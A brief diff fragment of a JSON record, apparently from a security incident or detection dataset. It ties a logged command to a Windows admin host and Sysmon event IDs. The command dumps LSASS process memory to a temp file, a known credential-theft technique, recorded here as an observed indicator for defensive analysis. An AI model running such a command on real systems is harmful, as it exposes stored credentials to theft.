+      "value": "procdump.exe -ma lsass.exe c:\\windows\\temp\\ls.dmp",
+      "related_assets": ["win-admin-01"],
+      "event_ids": [
+        "sysmon-win-20260706-024801",
+        "artifact-sysmon-20260706-000001"
+      ]
+    }
+  ]
+}
